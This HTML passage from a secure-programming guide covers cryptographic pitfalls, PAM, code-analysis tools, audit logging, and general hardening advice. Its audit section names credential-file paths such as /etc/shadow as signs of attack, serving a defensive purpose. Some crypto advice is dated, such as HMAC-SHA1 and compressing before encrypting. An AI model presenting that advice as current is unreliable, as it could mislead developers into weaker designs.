HREF="http://csrc.nist.gov/CryptoToolkit/modes"
TARGET="_top"
>NIST has developed and proposed
a new mode</A
> for using cryptographic algorithms called
<A
HREF="http://www.counterpane.com/crypto-gram-0301.html"
TARGET="_top"
>Randomized Message Authentication Code (RMAC)</A
>.
RMAC is intended for use as a message authentication code technique.</P
><P
>Although there&#8217;s a formal proof showing that RMAC is secure, the
proof depends on the highly questionable assumption that
the underlying cryptographic algorithm
meets the "ideal cipher model" - in particular, that the algorithm is
secure against a variety of specialized attacks, including related-key attacks.
Unfortunately, related-key attacks are poorly studied for many algorithms;
this is not the kind of property or attack that most people worry about
when analyzing with cryptographic algorithms.
It&#8217;s known triple-DES doesn&#8217;t have this properly, and it&#8217;s unclear if
other widely-accepted algorithms like AES have this property
(it appears that AES is at least weaker against related key attacks than
usual attacks).</P
><P
>The best advice right now is "don&#8217;t use RMAC".
There are other ways to do message authentication, such as HMAC
combined with a cryptographic hash algorithm (e.g., HMAC-SHA1).
HMAC isn&#8217;t the same thing (e.g., technically it doesn&#8217;t include a
nonce, so you should rekey sooner), but the theoretical weaknesses
of HMAC are merely theoretical, while the problems in RMAC seem far
more important in the real world.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="CRYPTO-OTHER"
>11.5.7. Other Cryptographic Issues</A
></H3
><P
>You should both encrypt and include integrity checks of data that&#8217;s important.
Don&#8217;t depend on the encryption also providing integrity - an attacker may
be able to change the bits into a different value, and although the attacker
may not be able to change it to a specific value, merely changing the
value may be enough.
In general, you should use different keys for integrity and secrecy, to
avoid certain subtle attacks.</P
><P
>One issue not discussed often enough is the problem of <SPAN
CLASS="QUOTE"
>&#8220;traffic analysis.&#8221;</SPAN
>
That is, even if messages are encrypted and the encryption is not broken,
an adversary may learn a great deal just from the encrypted messages.
For example, if the presidents of two companies start exchanging many
encrypted email messages, it may suggest that the two comparies are
considering a merger.
For another example, many SSH implementations have been found to have a
weakness in exchanging passwords: observers could look at packets and 
determine the length (or length range) of the password, even if they
couldn&#8217;t determine the password itself.
They could also also determine other information about the password that
significantly aided in breaking it.</P
><P
>Be sure to not make it possible to solve a problem in parts, and use
different keys when the trust environment (who is trusted) changes.
Don&#8217;t use the same key for too long - after a while, change the session key
or password so an adversary will have to start over.</P
><P
>Generally you should compress something you&#8217;ll encrypt - this does
add a fixed header, which isn&#8217;t so good, but it eliminates many
patterns in the rest of the message as well as making the result
smaller, so it&#8217;s usually viewed as a <SPAN
CLASS="QUOTE"
>&#8220;win&#8221;</SPAN
> if compression is likely
to make the result smaller.</P
><P
>In a related note, if you must create your own communication
protocol, examine the problems of what&#8217;s gone on before.
Classics such as Bellovin [1989]&#8217;s review of security problems
in the TCP/IP protocol suite might help you, as well as
Bruce Schneier [1998]
and Mudge&#8217;s breaking of Microsoft&#8217;s PPTP implementation and their
follow-on work.
Again, be sure to give any new protocol widespread public review, and
reuse what you can.</P
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="USE-PAM"
>11.6. Using PAM</A
></H2
><P
>Pluggable Authentication Modules (PAM) is
a flexible mechanism for authenticating users.
Many Unix-like systems support PAM, including
Solaris, nearly all Linux distributions
(e.g., Red Hat Linux, Caldera, and Debian as of version 2.2),
and FreeBSD as of version 3.1.
By using PAM, your program can be independent of the
authentication scheme (passwords, SmartCards, etc.).
Basically, your program calls PAM, which at run-time determines
which <SPAN
CLASS="QUOTE"
>&#8220;authentication modules&#8221;</SPAN
> are required by checking the configuration
set by the local system administrator.
If you&#8217;re writing a program that requires authentication (e.g., entering
a password), you should include support for PAM.
You can find out more about the Linux-PAM project at
<A
HREF="http://www.kernel.org/pub/linux/libs/pam/index.html"
TARGET="_top"
>http://www.kernel.org/pub/linux/libs/pam/index.html</A
>.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="TOOLS"
>11.7. Tools</A
></H2
><P
>Some tools may help you detect security problems before
you field the result.
They can&#8217;t find all such problems, of course, but they can help
catch problems that would overwise slip by.
Here are a few tools, emphasizing open source / free software tools.</P
><P
>One obvious type of tool is a program to examine the source code
to search for patterns of known potential security problems
(e.g., calls to library functions in ways are often the source
of security vulnerabilities).
These kinds of programs are called <SPAN
CLASS="QUOTE"
>&#8220;source code scanners&#8221;</SPAN
>.
Here are a few such tools:
<P
></P
><UL
><LI
><P
>Flawfinder, which I&#8217;ve developed; it&#8217;s available at
<A
HREF="http://www.dwheeler.com/flawfinder"
TARGET="_top"
>http://www.dwheeler.com/flawfinder</A
>.
This is also a program that scans C/C++ source code for common problems,
and is also licensed under the GPL.
Unlike RATS, flawfinder is implemented in Python.
The developers of RATS and Flawfinder have agreed to find a way to
work together to create a single <SPAN
CLASS="QUOTE"
>&#8220;best of breed&#8221;</SPAN
> open source program.</P
></LI
><LI
><P
>RATS (Rough Auditing Tool for Security)
from Secure Software Solutions is available at
<A
HREF="http://www.securesw.com/rats"
TARGET="_top"
>http://www.securesw.com/rats</A
>.
This program scans C/C++ source code for common problems, and
is licensed under the GPL.</P
></LI
><LI
><P
>ITS4 from Cigital (formerly Reliable Software Technologies, RST)
also statically checks C/C++ code.
It is available free for non-commercial use, including its source code
and with certain modification and redistribution rights.
Note that this isn&#8217;t released as <SPAN
CLASS="QUOTE"
>&#8220;open source&#8221;</SPAN
> as defined by the
<A
HREF="http://www.opensource.org/osd.html"
TARGET="_top"
>Open
Source Definition</A
> (OSD) -
In particular, OSD point 6 forbids
<SPAN
CLASS="QUOTE"
>&#8220;non-commercial use only&#8221;</SPAN
> clauses in open source licenses.
ITS4 is available at
<A
HREF="http://www.rstcorp.com/its4"
TARGET="_top"
>http://www.rstcorp.com/its4</A
>.</P
></LI
><LI
><P
>Splint (formerly named LCLint) is a tool for statically checking C programs.
With minimal effort, splint can be used as a better lint.
If additional effort is invested adding annotations to programs,
splint can perform stronger checking than can be done by any standard lint. 
For example, it can be used to statically detect likely buffer overflows.
The software is licensed under the GPL and is available at
<A
HREF="http://www.splint.org"
TARGET="_top"
>http://www.splint.org</A
>.</P
></LI
><LI
><P
>cqual is a type-based analysis tool for finding bugs in C programs. cqual 
extends the type system of C with extra user-defined type qualifiers, 
e.g., it can note that values are <SPAN
CLASS="QUOTE"
>&#8220;tainted&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;untainted&#8221;</SPAN
>
(similar to Perl&#8217;s taint checking). The 
programmer annotates their program in a few places, and cqual performs 
qualifier inference to check whether the annotations are correct. cqual 
presents the analysis results using Program Analysis Mode, an emacs-based
interface.
The current version of cqual can detect potential format-string 
vulnerabilities in C programs.
A previous incarnation of cqual, Carillon, 
has been used to find Y2K bugs in C programs.
The software is licensed under the GPL and is available from
<A
HREF="http://www.cs.berkeley.edu/Research/Aiken/cqual"
TARGET="_top"
>http://www.cs.berkeley.edu/Research/Aiken/cqual</A
>.</P
></LI
><LI
><P
>Smatch is a general-purpose static analysis tools for C/C++ programs.
It generates output describing statically-determined states in a program,
and has an API to let you define queries for potentially bad situations.
It was originally designed to analyze the Linux kernel.
More information is at
<A
HREF="http://smatch.sourceforge.net"
TARGET="_top"
>http://smatch.sourceforge.net</A
>.</P
></LI
><LI
><P
>Cyclone is a C-like language intended to remove C&#8217;s security weaknesses.
In theory, you can always switch to a language that is <SPAN
CLASS="QUOTE"
>&#8220;more secure,&#8221;</SPAN
>
but this doesn&#8217;t always help (a language can help you avoid common mistakes
but it can&#8217;t read your mind).
<A
HREF="http://www.securityfocus.com/guest/9094"
TARGET="_top"
>John Viega has
reviewed Cyclone</A
>, and in December 2001 he said:
<SPAN
CLASS="QUOTE"
>&#8220;Cyclone is definitely a neat language.
It&#8217;s a C dialect that doesn&#8217;t feel like it&#8217;s taking away any power,
yet adds strong safety guarantees, along with numerous features that
can be a real boon to programmers.
Unfortunately, Cyclone isn&#8217;t yet ready for prime time.
Even with crippling limitations aside, it doesn&#8217;t yet offer
enough advantages over Java (or even C with a good set of tools)
to make it worth the risk of using what is still a very young technology.
Perhaps in a few years, Cyclone will mature into a robust,
widely supported language that comes dangerously
close to C in terms of efficiency.
If that day comes, you&#8217;ll certainly see me abandoning C for good.&#8221;</SPAN
>
The Cyclone compiler has been released under the GPL and LGPL.
You can get more information from the
<A
HREF="http://www.research.att.com/projects/cyclone"
TARGET="_top"
>Cyclone web site</A
>.</P
></LI
></UL
></P
><P
>Some tools try to detect potential security flaws at run-time,
either to counter them or at least to warn the developer about them.
Much of Crispin Cowan&#8217;s work, such as StackGuard, fits here.</P
><P
>There are several tools that try to detect various C/C++ memory-management
problems; these are really general-purpose software quality improvement
tools, and not specific to security, but memory management problems
can definitely cause security problems.
An especially capable tool is
<A
HREF="http://developer.kde.org/~sewardj"
TARGET="_top"
>Valgrind</A
>,
which detects various memory-management problems
(such as use of uninitialized memory, reading/writing memory after it&#8217;s been
free&#8217;d, reading/writing off the end of malloc&#8217;ed blocks,
and memory leaks).
Another such tool is Electric Fence (efence) by Bruce Perens, which can
detect certain memory management errors.
<A
HREF="http://www.linkdata.se/sourcecode.html"
TARGET="_top"
>Memwatch</A
>
(public domain) and
<A
HREF="http://odin.ac.hmc.edu/~neldredge/yamd/"
TARGET="_top"
>YAMD</A
> (GPL)
can detect memory allocation problems for C and C++.
You can even use the built-in capabilities of the
GNU C library&#8217;s malloc library, which has the
MALLOC_CHECK_ environment variable (see its manual page for more information).
There are many others.</P
><P
>Another approach is to create test patterns and run the program,
in attempt to find weaknesses in the program.
Here are a few such tools:
<P
></P
><UL
><LI
><P
>BFBTester, the Brute Force Binary Tester, is licensed under the GPL.
This program does quick security checks of binary programs.
BFBTester performs checks of single and multiple argument
command line overflows and environment variable overflows.
Version 2.0 and higher can also watch for tempfile creation activity
(to check for using unsafe tempfile names). 
At one time BFBTester didn&#8217;t run on Linux (due to
a technical issue in Linux&#8217;s POSIX threads implementation), but this
has been fixed as of version 2.0.1.
More information is available at
<A
HREF="http://bfbtester.sourceforge.net/"
TARGET="_top"
>http://bfbtester.sourceforge.net/</A
></P
></LI
><LI
><P
>The 
<A
HREF="http://fuzz.sourceforge.net"
TARGET="_top"
>fuzz</A
>
program
is a tool for testing other software.
It tests programs by bombarding the program being evaluated with random data.
This tool isn&#8217;t really specific to security.</P
></LI
><LI
><P
><A
HREF="http://www.immunitysec.com/spike.html"
TARGET="_top"
>SPIKE</A
>
is a "fuzzer creation kit", i.e., it&#8217;s a toolkit designed to
create "random" tests to find security problems.
The SPIKE toolkit is particularly designed for protocol analysis by
simulating network protocol clients, and SPIKE proXy is a tool built on
SPIKE to test web applications.
SPIKE includes a few pre-canned tests.
SPIKE is licensed under the GPL.</P
></LI
></UL
></P
><P
>There are a number of tools that try to give you insight into running
programs that can also be useful when trying to find security problems
in your code.
This includes symbolic debuggers (such as gdb) and trace programs
(such as strace and ltrace).
One interesting program to support analysis of running code is
<A
HREF="http://razor.bindview.com/tools/fenris"
TARGET="_top"
>Fenris</A
> (GPL license).
Its documentation describes Fenris as a
<SPAN
CLASS="QUOTE"
>&#8220;multipurpose tracer, stateful analyzer and partial decompiler
intended to simplify bug tracking,
security audits, code, algorithm or protocol analysis -
providing a structural program trace, general information
about internal constructions, execution path,
memory operations, I/O, conditional expressions and much more.&#8221;</SPAN
>
Fenris actually supplies a whole suite of tools, including
extensive forensics capabilities and
<A
HREF="http://lcamtuf.coredump.cx/fdesk.jpg"
TARGET="_top"
>a
nice debugging GUI for Linux</A
>.
A list of other promising open source tools that can be suitable
for debugging or code analysis is available at
<A
HREF="http://lcamtuf.coredump.cx/fenris/debug-tools.html"
TARGET="_top"
>http://lcamtuf.coredump.cx/fenris/debug-tools.html</A
>.
Another interesting program along these lines is Subterfugue,
which allows you to control what happens in every system call made
by a program.</P
><P
>If you&#8217;re building a common kind of product where many standard
potential flaws exist (like an ftp server or firewall), you might
find standard security scanning tools useful.
One good one is
<A
HREF="http://www.nessus.org"
TARGET="_top"
>Nessus</A
>; there are many others.
These kinds of tools are very useful for doing regression testing,
but since they essentially use a list of past specific vulnerabilities
and common configuration errors,
they may not be very helpful in finding problems in new programs.</P
><P
>Often, you&#8217;ll need to call on other tools to implement your secure
infrastructure.
The
<A
HREF="http://ospkibook.sourceforge.net"
TARGET="_top"
>Open-Source PKI Book</A
>
describes a number of open source programs for
implementing a public key infrastructure (PKI).</P
><P
>Of course, running a <SPAN
CLASS="QUOTE"
>&#8220;secure&#8221;</SPAN
> program on an insecure platform
configuration makes little sense.
You may want to examine hardening systems, which attempt to configure
or modify systems to be more resistant to attacks.
For Linux, one hardening system is
Bastille Linux, available at
<A
HREF="http://www.bastille-linux.org"
TARGET="_top"
>http://www.bastille-linux.org</A
>.</P
><P
>Another list of security tools is available at
<A
HREF="http://www.insecure.org/tools.html"
TARGET="_top"
>http://www.insecure.org/tools.html</A
>.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="WINDOWS-CE"
>11.8. Windows CE</A
></H2
><P
>If you&#8217;re securing a Windows CE Device, you should read
Maricia Alforque&#8217;s
"Creating a Secure Windows CE Device" at
<A
HREF="http://msdn.microsoft.com/library/techart/winsecurity.htm"
TARGET="_top"
>http://msdn.microsoft.com/library/techart/winsecurity.htm</A
>.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="WRITE-AUDIT-RECORDS"
>11.9. Write Audit Records</A
></H2
><P
>Write audit logs for program startup, session startup, and
for suspicious activity.
Possible information of value includes date, time, uid, euid, gid, egid,
terminal information, process id, and command line values.
You may find the function syslog(3) helpful for implementing audit logs.
One awkward problem is that any logging system should be able to record
a lot of information (since this information could be very helpful), yet
if the information isn&#8217;t handled carefully the information itself could be
used to create an attack.
After all, the attacker controls some of the input being sent to the program.
When recording data sent by a possible attacker,
identify a list of <SPAN
CLASS="QUOTE"
>&#8220;expected&#8221;</SPAN
> characters and
escape any <SPAN
CLASS="QUOTE"
>&#8220;unexpected&#8221;</SPAN
> characters so that the log isn&#8217;t corrupted.
Not doing this can be a real problem; users may include characters
such as control characters (especially NIL or end-of-line) that
can cause real problems.
For example, if an attacker embeds a newline, they can then forge
log entries by following the newline with the desired log entry.
Sadly, there doesn&#8217;t seem to be a standard convention for escaping these
characters.
I&#8217;m partial to the URL escaping mechanism
(%hh where hh is the hexadecimal value of the escaped byte) but there
are others including the C convention (\ooo for the octal value and \X
where X is a special symbol, e.g., \n for newline).
There&#8217;s also the caret-system (^I is control-I), though that doesn&#8217;t
handle byte values over 127 gracefully.</P
><P
>There is the danger that a user could create a denial-of-service attack
(or at least stop auditing)
by performing a very large number of events that cut an audit record until
the system runs out of resources to store the records.
One approach to counter to this threat is to rate-limit audit record
recording; intentionally slow down the response rate
if <SPAN
CLASS="QUOTE"
>&#8220;too many&#8221;</SPAN
> audit records are being cut.
You could try to slow the response rate only to the suspected attacker,
but in many
situations a single attacker can masquerade as potentially many users.</P
><P
>Selecting what is <SPAN
CLASS="QUOTE"
>&#8220;suspicious activity&#8221;</SPAN
> is, of course, dependent on
what the program does and its anticipated use.
Any input that fails the filtering checks discussed earlier is
certainly a candidate (e.g., containing NIL).
Inputs that could not result from normal use should probably be logged,
e.g., a CGI program where certain required fields are missing
in suspicious ways.
Any input with phrases like /etc/passwd or /etc/shadow
or the like is very suspicious in many cases.
Similarly, trying to access Windows <SPAN
CLASS="QUOTE"
>&#8220;registry&#8221;</SPAN
> files or .pwl files
is very suspicious.</P
><P
>Do not record passwords in an audit record.
Often people accidentally enter passwords for a different system,
so recording a password may allow a system administrator to break into a
different computer outside the administrator&#8217;s domain.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="PHYSICAL-EMISSIONS"
>11.10. Physical Emissions</A
></H2
><P
>Although it&#8217;s really outside the scope of this book, it&#8217;s
important to remember that computing and communications equipment leaks a lot
information that makes them hard to really secure.
Many people are aware of TEMPEST requirements which deal with
radio frequency emissions of computers, displays, keyboards, and other
components which can be eavesdropped.
The light from displays can also be eavesdropped, even if it&#8217;s bounced off an
office wall at great distance
[Kuhn 2002].
Modem lights are also enough to determine the underlying communication.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="MISCELLANEOUS"
>11.11. Miscellaneous</A
></H2
><P
>The following are miscellaneous security guidelines that I couldn&#8217;t
seem to fit anywhere else:</P
><P
>Have your program check at least some of its assumptions before it uses them
(e.g., at the beginning of the program).
For example, if you depend on the <SPAN
CLASS="QUOTE"
>&#8220;sticky&#8221;</SPAN
> bit being set on a given
directory, test it; such tests take little time and could prevent
a serious problem.
If you worry about the execution time of some tests on each call, at least
perform the test at installation time, or even better at least
perform the test on application start-up.</P
><P
>If you have a built-in scripting language, it may be possible for the
language to set an environment variable which adversely affects the
program invoking the script.
Defend against this.</P
><P
>If you need a complex configuration language,
make sure the language has a comment
character and include a number of commented-out secure examples.
Often <SPAN
CLASS="QUOTE"
>&#8220;#&#8221;</SPAN
> is used for commenting, meaning
<SPAN
CLASS="QUOTE"
>&#8220;the rest of this line is a comment&#8221;</SPAN
>.</P
><P
>If possible, don&#8217;t create setuid or setgid root programs;
make the user log in as root instead.</P
><P
>Sign your code. That way, others can check to see if what&#8217;s available
was what was sent.</P
><P
>In some applications you may need to worry about timing attacks,
where the variation in timing or CPU utilitization is enough to give
away important information.
This kind of attack has been used to obtain keying information from
Smartcards, for example.
Mauro Lacy has
published a paper titled
<A
HREF="http://maurol.com.ar/security/RTT.pdf"
TARGET="_top"
>Remote Timing Techniques</A
>,
showing that you can (in some cases) determine over an Internet
whether or not a given user id exists, simply from the effort expended
by the CPU
(which can be detected remotely using techniques described in the paper).
The only way to deal with these sorts of problems is to make sure that
the same effort is performed even when it isn&#8217;t necessary.
The problem is that in some cases this may make the system more vulnerable
to a denial of service attack, since it can&#8217;t optimize away unnecessary work.</P
><P
>Consider statically linking secure programs.
This counters attacks on the dynamic link library mechanism
by making sure that the secure programs don&#8217;t use it.
There are several downsides to this however.
This is likely to increase disk and memory use (from multiple copies of the
same routines).
Even worse, it makes updating of libraries
(e.g., for security vulnerabilities) more difficult - in most systems
they won&#8217;t be automatically updated and have to be tracked and
implemented separately.</P
><P
>When reading over code, consider all the cases where a match is not made.
For example, if there is a switch statement, what happens when none of the
cases match?
If there is an <SPAN
CLASS="QUOTE"
>&#8220;if&#8221;</SPAN
> statement, what happens when the condition is false?</P
><P
>Merely <SPAN
CLASS="QUOTE"
>&#8220;removing&#8221;</SPAN
> a file doesn&#8217;t eliminate the file&#8217;s data from a disk;
on most systems this simply marks the content as <SPAN
CLASS="QUOTE"
>&#8220;deleted&#8221;</SPAN
> and makes it
eligible for later reuse, and often data is at least temporarily stored
in other places (such as memory, swap files, and temporary files).
Indeed, against a determined attacker, writing over the data isn&#8217;t enough.
A classic paper on the problems of erasing magnetic media is
Peter Gutmann&#8217;s paper
<A
HREF="http://www-tac.cisco.com/Support_Library/field_alerts/fn13070.html"
TARGET="_top"
><SPAN
CLASS="QUOTE"
>&#8220;Secure Deletion of Data from Magnetic and Solid-State Memory&#8221;</SPAN
></A
>.
A determined adversary can use other means, too, such as monitoring
electromagnetic emissions from computers (military systems have to obey
TEMPEST rules to overcome this)
and/or surreptitious attacks (such as monitors hidden in keyboards).</P
><P
>When fixing a security vulnerability,
consider adding a <SPAN
CLASS="QUOTE"
>&#8220;warning&#8221;</SPAN
> to detect and log an attempt to
exploit the (now fixed) vulnerability.
This will reduce the likelihood of an attack, especially if there&#8217;s
no way for an attacker to predetermine if the attack will work,
since it exposes an attack in progress.
In short, it turns a vulnerability into an intrusion detection system.
This also suggests that exposing the version of a server program
before authentication is usually a bad idea for security, since doing so
makes it easy for an attacker to only use attacks that would work.
Some programs make it possible for users to intentionally <SPAN
CLASS="QUOTE"
>&#8220;lie&#8221;</SPAN
> about their
version, so that attackers will use the <SPAN
CLASS="QUOTE"
>&#8220;wrong attacks&#8221;</SPAN
> and be detected.
Also, if the vulnerability can be triggered over a network, please make
sure that security scanners can detect the vulnerability.
I suggest contacting Nessus
(<A
HREF="http://www.nessus.org"
TARGET="_top"
>http://www.nessus.org</A
>)
and make sure that their open source security scanner can detect the
problem.
That way, users who don&#8217;t check their software for upgrades
will at least learn about the problem during their security vulnerability
scans (if they do them as they should).</P
><P
>Always include in your documentation contact information for
where to report security problems.
You should also support at least one of the common email addresses
for reporting security problems
(security-alert@SITE, secure@SITE, or security@SITE);
it&#8217;s often good to have support@SITE and info@SITE working as well.
Be prepared to support industry practices by those who have a security
flaw to report, such as the
<A
HREF="http://www.wiretrip.net/rfp/policy.html"
TARGET="_top"
>Full Disclosure Policy (RFPolicy)</A
>
and the IETF Internet draft,
<SPAN
CLASS="QUOTE"
>&#8220;Responsible Vulnerability Disclosure Process&#8221;</SPAN
>.
It&#8217;s important to quickly work with anyone who
is reporting a security flaw; remember that they are doing you a favor
by reporting the problem to you, and that they are under no obligation
to do so.
It&#8217;s especially important, once the problem is fixed, to give proper credit
to the reporter of the flaw (unless they ask otherwise).
Many reporters provide the information solely to gain the credit,
and it&#8217;s generally accepted that credit is owed to the reporter.
Some vendors argue that people should never report vulnerabilities to the
public; the problem with this argument is that this was once common, and the
result was vendors who denied vulnerabilities while their customers were
getting constantly subverted for years at a time.</P
><P
>Follow best practices and common conventions when leading a
software development project.
If you are leading an open source software / free software project,
some useful guidelines can be found in
<A
HREF="http://www.tldp.org/HOWTO/Software-Proj-Mgmt-HOWTO/index.html"
TARGET="_top"
>Free Software Project Management HOWTO</A
> and
<A
HREF="http://www.tldp.org/HOWTO/Software-Release-Practice-HOWTO/index.html"
TARGET="_top"
>Software Release Practice HOWTO</A
>;
you should also read
<A
HREF="http://www.catb.org/~esr/writings/cathedral-bazaar"
TARGET="_top"
>The Cathedral and the Bazaar</A
>.</P
><P
>Every once in a while, review security guidelines like this one.
At least re-read the conclusions in <A
HREF="#CONCLUSION"
>Chapter 12</A
>,
and feel free to go back to the introduction
(<A
HREF="#INTRODUCTION"
>Chapter 1</A
>) and start again!</P
></DIV
></DIV
><DIV
CLASS="CHAPTER"
><HR><H1
><A
NAME="CONCLUSION"
></A
>Chapter 12. Conclusion</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>The end of a matter is better than its beginning, and
patience is better than pride.</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>Ecclesiastes 7:8 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><P
>Designing and implementing a truly secure program
is actually a difficult task.
The difficulty is that a truly secure program must respond
appropriately to all possible inputs and environments
controlled by a potentially hostile user.
Developers of secure programs must deeply understand their platform,
seek and use guidelines (such as these), and then use assurance
processes (such as inspections and other peer review techniques)
to reduce their programs&#8217; vulnerabilities.</P
><P
>In conclusion, here are some of the key guidelines in this book:

<P
></P
><UL
><LI
><P
>Validate all your inputs, including command line inputs,
environment variables, CGI inputs, and so on.
Don&#8217;t just reject <SPAN
CLASS="QUOTE"
>&#8220;bad&#8221;</SPAN
> input; define what is an <SPAN
CLASS="QUOTE"
>&#8220;acceptable&#8221;</SPAN
> input
and reject anything that doesn&#8217;t match.</P
></LI
><LI
><P
>Avoid buffer overflow.
Make sure that long inputs (and long intermediate data values) can&#8217;t
be used to take over your program.
This is the primary programmatic error at this time.</P
></LI
><LI
><P
>Structure program internals.
Secure the interface, minimize privileges, make the initial configuration
and defaults safe, and fail safe.
Avoid race conditions (e.g., by safely opening any files in a shared
directory like /tmp).
Trust only trustworthy channels
(e.g., most servers must not trust their clients for security checks or
other sensitive data such as an item&#8217;s price in a purchase).</P
></LI
><LI
><P
>Carefully call out to other resources.
Limit their values to valid values (in particular be concerned about
metacharacters), and check all system call return values.</P
></LI
><LI
><P
>Reply information judiciously.
In particular, minimize feedback, and handle full or unresponsive output
to an untrusted user.</P
></LI
></UL
>&#13;</P
></DIV
><DIV
CLASS="CHAPTER"
><HR><H1
><A
NAME="BIBLIOGRAPHY"
></A
>Chapter 13. Bibliography</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>The words of the wise are like goads, their collected sayings like
firmly embedded nails--given by one Shepherd. 
Be warned, my son, of anything in addition to them.
Of making many books there is no end, and much study wearies the body.</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>Ecclesiastes 12:11-12 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><P
><EM
>Note that there is a heavy
emphasis on technical articles available on the web, since this is where
most of this kind of technical information is available.</EM
></P
><P
>[Advosys 2000]
Advosys Consulting
(formerly named Webber Technical Services).
<EM
>Writing Secure Web Applications</EM
>.
<A
HREF="http://advosys.ca/tips/web-security.html"
TARGET="_top"
>http://advosys.ca/tips/web-security.html</A
></P
><P
>[Al-Herbish 1999]
Al-Herbish, Thamer.
1999.
<EM
>Secure Unix Programming FAQ</EM
>.
<A
HREF="http://www.whitefang.com/sup"
TARGET="_top"
>http://www.whitefang.com/sup</A
>.</P
><P
>[Aleph1 1996] 
Aleph1.
November 8, 1996.
<SPAN
CLASS="QUOTE"
>&#8220;Smashing The Stack For Fun And Profit&#8221;</SPAN
>.
<EM
>Phrack Magazine</EM
>.
Issue 49, Article 14.
<A
HREF="http://www.phrack.com/search.phtml?view&#38;article=p49-14"
TARGET="_top"
>http://www.phrack.com/search.phtml?view&#38;article=p49-14</A
>
or alternatively
<A
HREF="http://www.2600.net/phrack/p49-14.html"
TARGET="_top"
>http://www.2600.net/phrack/p49-14.html</A
>.</P
><P
>[Anonymous 1999]
Anonymous.
October 1999.
Maximum Linux Security:
A Hacker&#8217;s Guide to Protecting Your Linux Server and Workstation
Sams.
ISBN: 0672316706.</P
><P
>[Anonymous 1998]
Anonymous.
September 1998.
Maximum Security : A Hacker&#8217;s Guide to Protecting Your
Internet Site and Network.
Sams.
Second Edition.
ISBN: 0672313413.</P
><P
>[Anonymous Phrack 2001]
Anonymous.
August 11, 2001.
Once upon a free().
Phrack, Volume 0x0b, Issue 0x39, Phile #0x09 of 0x12.
<A
HREF="http://phrack.org/show.php?p=57&#38;a=9"
TARGET="_top"
>http://phrack.org/show.php?p=57&#38;a=9</A
></P
><P
>[AUSCERT 1996]
Australian Computer Emergency Response Team (AUSCERT) and O&#8217;Reilly.
May 23, 1996 (rev 3C).
<EM
>A Lab Engineers Check List for Writing Secure Unix Code</EM
>.
<A
HREF="ftp://ftp.auscert.org.au/pub/auscert/papers/secure_programming_checklist"
TARGET="_top"
>ftp://ftp.auscert.org.au/pub/auscert/papers/secure_programming_checklist</A
></P
><P
>[Bach 1986]
Bach, Maurice J.
1986.
<EM
>The Design of the Unix Operating System</EM
>.
Englewood Cliffs, NJ: Prentice-Hall, Inc.
ISBN 0-13-201799-7 025.</P
><P
>[Beattie 2002]
Beattie, Steve, Seth Arnold, Crispin Cowan, Perry Wagle, Chris Wright,
Adam Shostack.
November 2002.
Timing the Application of Security Patches for Optimal Uptime.
2002 LISA XVI, November 3-8, 2002, Philadelphia, PA.</P
><P
>[Bellovin 1989]
Bellovin, Steven M.
April 1989. 
"Security Problems in the TCP/IP Protocol Suite"
Computer Communications Review 2:19, pp. 32-48.
<A
HREF="http://www.research.att.com/~smb/papers/ipext.pdf"
TARGET="_top"
>http://www.research.att.com/~smb/papers/ipext.pdf</A
></P
><P
>[Bellovin 1994]
Bellovin, Steven M.
December 1994.
<EM
>Shifting the Odds -- Writing (More) Secure Software</EM
>.
Murray Hill, NJ: AT&#38;T Research.
<A
HREF="http://www.research.att.com/~smb/talks"
TARGET="_top"
>http://www.research.att.com/~smb/talks</A
></P
><P
>[Bishop 1996]
Bishop, Matt.
May 1996.
<SPAN
CLASS="QUOTE"
>&#8220;UNIX Security: Security in Programming&#8221;</SPAN
>.
<EM
>SANS &#8217;96</EM
>. Washington DC (May 1996).
<A
HREF="http://olympus.cs.ucdavis.edu/~bishop/secprog.html"
TARGET="_top"
>http://olympus.cs.ucdavis.edu/~bishop/secprog.html</A
></P
><P
>[Bishop 1997]
Bishop, Matt.
October 1997.
<SPAN
CLASS="QUOTE"
>&#8220;Writing Safe Privileged Programs&#8221;</SPAN
>.
<EM
>Network Security 1997</EM
>
New Orleans, LA.
<A
HREF="http://olympus.cs.ucdavis.edu/~bishop/secprog.html"
TARGET="_top"
>http://olympus.cs.ucdavis.edu/~bishop/secprog.html</A
></P
><P
>[Blaze 1996]
Blaze, Matt, Whitfield Diffie, Ronald L. Rivest, Bruce Schneier,
Tsutomu Shimomura, Eric Thompson, and Michael Wiener.
January 1996.
<SPAN
CLASS="QUOTE"
>&#8220;Minimal Key Lengths for Symmetric Ciphers to Provide
Adequate Commercial Security:
A Report by an Ad Hoc Group of Cryptographers and Computer Scientists.&#8221;</SPAN
>
<A
HREF="ftp://ftp.research.att.com/dist/mab/keylength.txt"
TARGET="_top"
>ftp://ftp.research.att.com/dist/mab/keylength.txt</A
> and
<A
HREF="ftp://ftp.research.att.com/dist/mab/keylength.ps"
TARGET="_top"
